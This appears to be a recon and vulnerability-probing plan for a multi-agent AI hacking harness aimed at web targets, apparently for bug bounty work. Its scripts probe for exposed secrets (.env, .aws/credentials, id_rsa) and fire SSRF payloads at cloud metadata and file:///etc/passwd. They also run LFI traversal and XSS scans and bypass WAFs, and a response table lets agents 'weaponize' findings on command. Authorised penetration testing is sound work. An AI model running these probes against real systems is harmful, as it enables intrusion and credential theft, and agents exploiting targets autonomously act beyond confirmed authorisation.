# Recon Execution Plan
## Generated: 2026-06-25
## Target: {{TARGET_NAME}}
## Scope: {{SCOPE_TYPE}} (URL_ONLY or WILDCARD)

---

## ═══════════════════════ SCOPE GATE ═══════════════════════

### BEFORE ANY RECON — scope rule
Default: URL_ONLY. No subfinder/amass/crt.sh unless user explicitly says "wildcard" or "all subdomains".

If user says "recon X.com" → treat as URL_ONLY
If user says "recon *.X.com" or "wildcard" → full recon

### Output Paths
```
RECON_DIR = ~/Targets/{{TARGET_NAME}}/recon/
SCRIPTS_DIR = ~/Targets/{{TARGET_NAME}}/scripts/
PLAN = ~/Targets/{{TARGET_NAME}}/plan.md
A0_DIR = $RECON_DIR/.a0/        ← ALL A0 signals and status live here
VAULT = ~/Targets/
SESSION_FILE = ~/Targets/{{TARGET_NAME}}/session.txt
AUTH_TOKEN=***  ~/Targets/{{TARGET_NAME}}/token.txt
```bash
export PATH=$PATH:/home/kali/go/bin:/home/kali/.local/bin
command -v katana gau waybackurls qsreplace getJS jsluice whatweb >/dev/null || {
  echo "Missing tools — installing once..."
  go install github.com/lc/gau/v2/cmd/gau@latest 2>/dev/null
  go install github.com/tomnomnom/waybackurls@latest 2>/dev/null
  go install github.com/tomnomnom/qsreplace@latest 2>/dev/null
}
[ -f /tmp/xsstrike_venv/bin/xsstrike ] || python3 -m venv /tmp/xsstrike_venv 2>/dev/null && /tmp/xsstrike_venv/bin/pip install xsstrike 2>/dev/null
[ -f /tmp/cffi_venv/bin/python ] || python3 -m venv /tmp/cffi_venv 2>/dev/null && /tmp/cffi_venv/bin/pip install curl_cffi 2>/dev/null
[ -f /tmp/arjun_venv/bin/arjun ] || python3 -m venv /tmp/arjun_venv 2>/dev/null && /tmp/arjun_venv/bin/pip install arjun 2>/dev/null
echo "Prerequisites OK"
```

### Tool Paths (use these, DO NOT install)
```bash
export PATH=$PATH:/home/kali/go/bin:/home/kali/.local/bin
GAU=/home/kali/go/bin/gau
WAYBACKURLS=/home/kali/go/bin/waybackurls
QSREPLACE=/home/kali/go/bin/qsreplace
ARJUN=/tmp/arjun_venv/bin/arjun
XSSTRIKE=/tmp/xsstrike_venv/bin/xsstrike
CURL_CFFI=/tmp/cffi_venv/bin/python
SSRFMAP=/home/kali/Tools/ssrfmap/ssrfmap.py
BSQLI=/home/kali/Tools/BSQLi-2.0/src/bsqli2.0.py
```

### A0 Signal Protocol — ALL in $RECON_DIR/.a0/
```
$RECON_DIR/.a0/agent_A1.sig  → "running" | "done:<summary>" | "failed:<reason>"
$RECON_DIR/.a0/agent_A2.sig  → same
$RECON_DIR/.a0/agent_A3.sig  → same
$RECON_DIR/.a0/agent_A4.sig  → same
$RECON_DIR/.a0/agent_A5.sig  → same
$RECON_DIR/.a0/status.txt    → Human-readable status (updated by A0 agent)
$RECON_DIR/.a0/findings.txt  → Findings with [NEW] tracking
```

**Every agent writes on start:**
```bash
mkdir -p "$RECON_DIR/.a0" && echo "running" > "$RECON_DIR/.a0/agent_A1.sig"
```

**Every agent writes on completion:**
```bash
echo "done: 40 sensitive files, whatweb done, CSP checked" > "$RECON_DIR/.a0/agent_A1.sig"
```

### Scope Discipline
```
If URL_ONLY: katana -u https://abc.com ONLY. gau --subs DISABLED. NO subfinder/amass.
If WILDCARD: subfinder/amass/crt.sh ENABLED. gau --subs. Full katana.
```

---

## ═══════════════════════ AGENT ORCHESTRATION ═══════════════════════

### A0 — Status Reporter (HH subagent, reports to me for decisions)
A0 runs as a HH subagent alongside A1-A5. It monitors signals in $RECON_DIR/.a0/ and writes status.

**A0 task — pass to spawn_agent when launching all agents:**
```
Spawn 6 agents: A0 (status reporter) + A1-A5 (workers).

A0's job: Monitor $RECON_DIR/.a0/agent_A*.sig every 30s. Write to $RECON_DIR/.a0/status.txt.

Loop:
  1. Read all agent signal files
  2. Calculate % based on elapsed vs timeout:
     A1=5min, A2=5min, A3=8min, A4=10min, A5=10min
  3. Write status with completion % and ETA
  4. Track findings with [NEW] tag:
     - Read recon/target_*.txt files
     - Compare against previous snapshot
     - Mark new/changed files as [NEW]
  5. When all agents done → write "ALL COMPLETE (100%)"
  6. Do NOT launch phases — wait for operator / Hacker-Harness approval
```

**Decision flow:**
```
A0 writes status → I read $RECON_DIR/.a0/status.txt
                 → I analyze: what's complete? what's missing? what's anomalous?
                 → I recommend: "A2 done (29K URLs). Recommend launching A3. Wayback 0 results — expected."
                 → You decide: go/skip/kill/modify
                 → I execute
```

### Agent Assignments

| Agent | Steps | Timeout | Signal File |
|-------|-------|---------|-------------|
| A1 | R1, R8, R9 | 5 min | $RECON_DIR/.a0/agent_A1.sig |
| A2 | R2, R3, R4 | 5 min | $RECON_DIR/.a0/agent_A2.sig |
| A3 | R5, R6 | 8 min | $RECON_DIR/.a0/agent_A3.sig |
| A4 | R7, R10, R11 | 10 min | $RECON_DIR/.a0/agent_A4.sig |
| A5 | R12, R13, E2, E1 | 10 min | $RECON_DIR/.a0/agent_A5.sig |

### Execution Phases
```
Phase 1: A1 + A2 parallel (max 5 min)
Phase 2: A3 after A2 (max 8 min) — needs katana.txt
Phase 3: A4 after A2+A3 (max 10 min) — Arjun capped 10 endpoints
Phase 4: A5 after A4 (max 10 min) — SSRF + LFI probes
```

---

## ═══════════════════════ PHASE 1 ═══════════════════════

### A1 — R1 + R8 + R9
```bash
A0DIR="$RECON_DIR/.a0" && mkdir -p "$A0DIR" && echo "running" > "$A0DIR/agent_A1.sig"
export PATH="$PATH:/home/kali/go/bin:/home/kali/.local/bin"

for path in .git/config .env .env.local credentials.json secrets.yaml \
            config/master.key database.yml .aws/credentials id_rsa \
            backup.sql Dockerfile docker-compose.yml phpinfo.php \
            .htaccess .svn/entries .DS_Store sitemap.xml robots.txt; do
  status=$(curl -s -o /dev/null -w "%{http_code}" "https://target.com/$path" 2>/dev/null)
  [ "$status" != "404" ] && echo "$status → $path"
done | sort -u > "$RECON_DIR/target_sensitive_files.txt"

whatweb -a 3 https://target.com --color=never > "$RECON_DIR/target_whatweb.txt" 2>/dev/null
curl -s -I https://target.com | grep -iE "x-frame-options|content-security-policy|strict-transport-security" > "$RECON_DIR/target_headers.txt"
curl -s -I https://target.com | grep -i "content-security-policy" | sed 's/.*content-security-policy: //I' > "$RECON_DIR/target_csp.txt"

echo "done: $(wc -l < $RECON_DIR/target_sensitive_files.txt) files, whatweb, CSP" > "$A0DIR/agent_A1.sig"
```

### A2 — R2 + R3 + R4
```bash
A0DIR="$RECON_DIR/.a0" && mkdir -p "$A0DIR" && echo "running" > "$A0DIR/agent_A2.sig"
export PATH="$PATH:/home/kali/go/bin:/home/kali/.local/bin"

katana -u https://target.com -d 3 -jc -k -o "$RECON_DIR/target_katana.txt" 2>/dev/null

if [ -s "$SESSION_FILE" ]; then
  katana -u https://target.com -H "Cookie: $(cat $SESSION_FILE)" -d 3 -jc -k \
    -o "$RECON_DIR/target_katana_auth.txt" 2>/dev/null
fi

/home/kali/go/bin/gau https://target.com | grep "target.com" > "$RECON_DIR/target_gau.txt" 2>/dev/null
/home/kali/go/bin/waybackurls https://target.com | grep "target.com" >> "$RECON_DIR/target_wayback.txt" 2>/dev/null
cat "$RECON_DIR/target_gau.txt" | grep -iE "(token|api[_-]?key|secret|password|auth|jwt|session)" > "$RECON_DIR/target_secrets.txt" 2>/dev/null

echo "done: $(wc -l < $RECON_DIR/target_katana.txt) katana, $(wc -l < $RECON_DIR/target_gau.txt) gau" > "$A0DIR/agent_A2.sig"
```

---

## ═══════════════════════ PHASE 2 ═══════════════════════

### A3 — R5 + R6
```bash
A0DIR="$RECON_DIR/.a0" && mkdir -p "$A0DIR" && echo "running" > "$A0DIR/agent_A3.sig"
export PATH="$PATH:/home/kali/go/bin:/home/kali/.local/bin"

if [ -s "$RECON_DIR/target_katana.txt" ]; then
  cat "$RECON_DIR/target_katana.txt" | grep -E "\.js$" | sort -u > "$RECON_DIR/target_js_urls.txt"
  getJS --url https://target.com > "$RECON_DIR/target_getjs.txt" 2>/dev/null
  jsluice urls "$RECON_DIR/target_js_urls.txt" 2>/dev/null >> "$RECON_DIR/target_endpoints.txt"
  jsluice secrets "$RECON_DIR/target_js_urls.txt" 2>/dev/null > "$RECON_DIR/target_js_secrets.txt"
  mkdir -p "$RECON_DIR/jsbundles"
  head -20 "$RECON_DIR/target_js_urls.txt" | while read url; do
    curl -s "$url" > "$RECON_DIR/jsbundles/$(echo $url | md5sum | cut -d' ' -f1).js" 2>/dev/null
  done
fi

getJS --url https://target.com --sourcemaps 2>/dev/null | grep "\.map" > "$RECON_DIR/target_sourcemaps.txt" 2>/dev/null
echo "done: $(ls $RECON_DIR/jsbundles/ 2>/dev/null | wc -l) bundles" > "$A0DIR/agent_A3.sig"
```

---

## ═══════════════════════ PHASE 3 ═══════════════════════

### A4 — R7 + R10 + R11
```bash
A0DIR="$RECON_DIR/.a0" && mkdir -p "$A0DIR" && echo "running" > "$A0DIR/agent_A4.sig"
export PATH="$PATH:/home/kali/go/bin:/home/kali/.local/bin"

# Step 1: Build gwjs_endpoints.txt — unique base paths from R3 + R5
cat "$RECON_DIR/target_gau.txt" "$RECON_DIR/target_wayback.txt" 2>/dev/null | \
  grep -oP 'https?://[^?"\s]*' | sort -u > "$RECON_DIR/gwjs_endpoints.txt"
cat "$RECON_DIR/target_endpoints.txt" 2>/dev/null >> "$RECON_DIR/gwjs_endpoints.txt"
sort -u -o "$RECON_DIR/gwjs_endpoints.txt" "$RECON_DIR/gwjs_endpoints.txt"

# Step 2: Arjun on top 10 base paths → mined_pendpoint.txt
head -10 "$RECON_DIR/gwjs_endpoints.txt" 2>/dev/null | while read url; do
  timeout 30 /tmp/arjun_venv/bin/arjun -u "$url" -t 5 -q 2>/dev/null
done | grep -E "^[a-z]" | sort -u > "$RECON_DIR/mined_pendpoint.txt"

# Step 3: qsreplace — extract existing params from all sources
cat "$RECON_DIR/target_gau.txt" "$RECON_DIR/target_wayback.txt" \
    "$RECON_DIR/mined_pendpoint.txt" 2>/dev/null | \
  /home/kali/go/bin/qsreplace FUZZ 2>/dev/null | sort -u > "$RECON_DIR/target_params.txt"

# Step 4: Build GWJSAJQ_urls.txt — merged, deduped, all URLs with params → feeds R10
cat "$RECON_DIR/target_gau.txt" "$RECON_DIR/target_wayback.txt" \
    "$RECON_DIR/mined_pendpoint.txt" 2>/dev/null | \
  grep -oP 'https?://[^"\s]*\?[^"\s]*' | sort -u > "$RECON_DIR/GWJSAJQ_urls.txt"

# Step 5: LFI-prone params → ptLFI.txt
grep -oP '(\?|&)(file|page|path|load|read|include|inc|template|root|dir|document|folder|view|show|local|full|location|pg|abs|name|cat|cmd|action)=[^&\s]+' "$RECON_DIR/target_params.txt" 2>/dev/null | sort -u > "$RECON_DIR/ptLFI.txt"

# Step 6: XSStrike on GWJSAJQ_urls.txt (first 20, 30s timeout each)
if [ -f /tmp/xsstrike_venv/bin/xsstrike ]; then
  head -20 "$RECON_DIR/GWJSAJQ_urls.txt" | while read url; do
    timeout 30 /tmp/xsstrike_venv/bin/xsstrike -u "$url" --skip-dom --blind 2>/dev/null
  done > "$RECON_DIR/target_xsstrike_output.txt"
fi

echo "done: $(wc -l < $RECON_DIR/GWJSAJQ_urls.txt) GWJSAJQ urls, $(wc -l < $RECON_DIR/ptLFI.txt) LFI" > "$A0DIR/agent_A4.sig"
```

---

## ═══════════════════════ PHASE 4 ═══════════════════════

### A5 — R12 + E2 + E1
```bash
A0DIR="$RECON_DIR/.a0" && mkdir -p "$A0DIR" && echo "running" > "$A0DIR/agent_A5.sig"
export PATH="$PATH:/home/kali/go/bin:/home/kali/.local/bin"

grep -oP '\?[^&\s]*=(url|dest|redirect|uri|path|continue|window|next|data|reference|site|html|val|validate|domain|callback|return|page|feed|host|port|to|out|view|dir|file|load|read|image|img|src|href|action|target)[&\s]' "$RECON_DIR/target_params.txt" 2>/dev/null | sort -u > "$RECON_DIR/target_ssrf_params.txt"
cat "$RECON_DIR/ptLFI.txt" >> "$RECON_DIR/target_ssrf_params.txt" 2>/dev/null
sort -u -o "$RECON_DIR/target_ssrf_params.txt" "$RECON_DIR/target_ssrf_params.txt"

for url in "http://169.254.169.254/latest/meta-data/" "http://localhost:5000" "file:///etc/passwd"; do
  for param in "url" "dest" "redirect" "path" "file"; do
    curl -s -m 3 "https://target.com/page?$param=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$url'))")" -o /dev/null -w "%{http_code}" 2>/dev/null
    echo " — $param=$url"
  done
done > "$RECON_DIR/target_ssrf_probes.txt"

cat "$RECON_DIR/ptLFI.txt" | while read line; do
  param=$(echo "$line" | cut -d= -f1 | tr -d '?&')
  url_base=$(echo "$line" | cut -d= -f1)
  curl -s -m 3 "$url_base$param=../../../../../etc/passwd" 2>/dev/null | grep -qi "root:" && echo "LFI: $url_base$param=../../../../../etc/passwd"
done > "$RECON_DIR/target_lfi_results.txt"

echo "done: SSRF+LFI probes complete" > "$A0DIR/agent_A5.sig"
```

---

## ═══════════════════════ COORDINATOR ═══════════════════════

### Agent Timeout Rules
```
$RECON_DIR/.a0/agent_A1.sig == "running" for > $TIMEOUT → kill, continue
$RECON_DIR/.a0/agent_A2.sig == "running" for > $TIMEOUT → kill, continue
...
```

### Progress Tracking
After each agent completes, update $TARGET_DIR/progress.md:
- Mark the corresponding R step as ✅ Completed / ❌ Failed
- Log findings and notes
- This persists across sessions for reference

### Context Management
```
After Phase 2: /compact focus on recon Phase 3
After Phase 3: /compact focus on recon Phase 4
After Phase 4: /compact focus on findings
```

### WAF Bypass
```bash
/tmp/cffi_venv/bin/python -c "
from curl_cffi import requests
r = requests.get('https://target.com', impersonate='chrome120')
print(r.text[:500])
"
```

---

## ═══════════════════════ A0 COORDINATOR — HUMAN-IN-THE-LOOP ═══════════════════════

A0 is the bridge between Hacker-Harness subagents and me (the supervisor).
It has two responsibilities:

### Responsibility 1: Monitor & Escalate
- Check all agent signal files every 60s
- Monitor file handoffs (A1→A2→A3→A4→A5)
- Kill hung agents that exceed timeout
- Report blockers (rate limits, auth walls, missing tools)
- Update progress.md every cycle

### Responsibility 2: Interactive Decision Relay
Not a passive progress monitor — an active bridge that engages me when needed.

### Flow
```
HH subagent finds something → escalate to operator → decide → continue
```

**🚨 prior engagement lesson:** File selection matters more than model capability. Once pointed at the right file, every model found the vulnerability instantly. Our data flow (gwjs_endpoints → mined_pendpoint) already does this — we narrow the target before HH reviews.

### When to Use spawn_agent vs Manual Testing
| Task | Use | Reason |
|------|-----|--------|
| JS bundle analysis | HH / spawn_agent | Spawn subagent to download + parse multi-MB bundles, extract routes/endpoints |
| GraphQL introspection | HH / spawn_agent | Spawn subagent for full schema dump, query gen, mutation testing |
| Code review (R15) | HH / spawn_agent | Spawn subagent for Bandit + Semgrep + **Medusa** + supply chain + deep analysis |
| GitHub recon (R14) | HH / spawn_agent | Spawn subagent to clone repos, grep, classify, review |
| Supply chain detection | HH / spawn_agent | Spawn subagent for typosquatting, dep confusion, CI/CD analysis |
| 403 bypass sweep | HH / spawn_agent | Spawn subagent — parallel method/path/header testing |
|| XSS reflection test | HH / spawn_agent | Spawn subagent with payload list, parallel param testing |
|| **RAG-FIRST** (XSS, CSP, CORS, WAF, cache poison, SSRF, XS-Leaks) | **Query API** | `curl https://api.preview.is/search` — never guess, retrieve writeups |
| Param discovery | HH / spawn_agent | Spawn subagent for Arjun + ffuf on multiple endpoints |
| OData probe | HH / spawn_agent | Spawn subagent for content negotiation + schema exploration |
| Fingerprinting | HH / spawn_agent | Quick whatweb/curl — single command, no subagent needed |

**If spawn_agent fails to start:**
1. `# HH / spawn_agent: C-c` to interrupt
2. Wait 5s, then re-send the task
3. If still stuck: `cancel the spawn_agent / session` and restart
4. If persists: note in hunt-log, run tests manually
| Trigger | What A0 Does |
|---------|--------------|
| Agent finds something interesting (potential P1-P3, sink, leak, auth bypass) | PAUSE agent, report finding with context, suggest direction options [a/b/c], then ask |
| Blocker (rate limit, auth wall, missing tool) | Report with suggested workaround |
| Module complete (e.g., all Tier 1) | Summary report |
| Ambiguous finding | Ask for judgment (real vs false positive) |

### When A0 Does NOT Engage Me
- Routine progress — update progress.md silently
- P3 findings — batch at end of module
- Fork with no target-specific changes — auto-skip

### A0 Message Format
```
[NEW FINDING] Agent <name> — <repo/file>
Type: P1/P2/P3 — <description>
Detail: <file:line — what was found>
Context: <relevant code or commit>
Question: Do you want me to:
  [a] <option A>
  [b] <option B>
  [c] Skip
```

### My Response Categories
| I Say | A0 Does |
|-------|---------|
| "Exploit it" | Agent tries to weaponize |
| "Dig deeper" | Agent investigates further |
| "Skip" | Finding noted, moves on |
| "Check [a/b/c]" | Executes specific sub-task |
| "Save finding" | Documents to Vulnerabilities.md |

| Issue | Action |
|-------|--------|
| WAF block | curl_cffi (/tmp/cffi_venv/bin/python) |
| Tool not found | Check /home/kali/go/bin/ and /tmp/*_venv/bin/ |
| Auth expired | Report for fresh cookies |
| Agent hung > timeout | Kill, continue with partial data |
| Context 90%+ | /compact or restart |
| No findings | Report "no results" |
| Stale A0 signals | `rm -rf $RECON_DIR/.a0/` before starting |

---

## ═══════════════════════ OUTPUT ═══════════════════════

```
~/Targets/targets/{{TARGET_NAME}}/recon/*.txt
~/Targets/targets/{{TARGET_NAME}}/scripts/
~/Targets/targets/{{TARGET_NAME}}/Vulnerabilities.md
~/Targets/targets/{{TARGET_NAME}}/recon/.a0/    ← A0 signals + status
```

### Cleanup
```bash
rm -rf "$RECON_DIR/.a0/"
echo "A0 signals cleaned — ready for next target"
```
